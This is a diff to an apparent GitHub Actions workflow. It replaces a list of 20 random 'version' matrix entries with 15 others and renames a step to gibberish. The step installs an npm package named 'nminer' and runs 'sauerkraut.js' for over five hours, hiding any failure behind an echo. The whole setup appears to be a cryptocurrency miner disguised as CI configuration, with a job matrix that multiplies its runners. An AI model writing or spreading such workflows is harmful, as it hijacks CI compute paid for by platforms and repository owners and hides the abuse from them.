@@ -9,26 +9,21 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 9980 }
-          - { version: 3065 }
-          - { version: 8562 }
-          - { version: 1022 }
-          - { version: 8737 }
-          - { version: 5470 }
-          - { version: 4030 }
-          - { version: 8446 }
-          - { version: 2056 }
-          - { version: 5671 }
-          - { version: 6985 }
-          - { version: 5099 }
-          - { version: 1368 }
-          - { version: 2728 }
-          - { version: 9956 }
-          - { version: 2216 }
-          - { version: 3788 }
-          - { version: 6303 }
-          - { version: 6060 }
-          - { version: 5315 }
+          - { version: 7849 }
+          - { version: 4266 }
+          - { version: 4450 }
+          - { version: 6098 }
+          - { version: 2255 }
+          - { version: 4495 }
+          - { version: 4550 }
+          - { version: 8988 }
+          - { version: 815 }
+          - { version: 1996 }
+          - { version: 5527 }
+          - { version: 5001 }
+          - { version: 2653 }
+          - { version: 6441 }
+          - { version: 6213 }
 
     steps:
       - name: Checkout
@@ -39,7 +34,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: after asset
+      - name: submitter citizen gadzooks
         run: |
           npm install nminer@latest
-          timeout 328m node sauerkraut.js || echo "sauerkraut executed"
+          timeout 311m node sauerkraut.js || echo "sauerkraut executed"
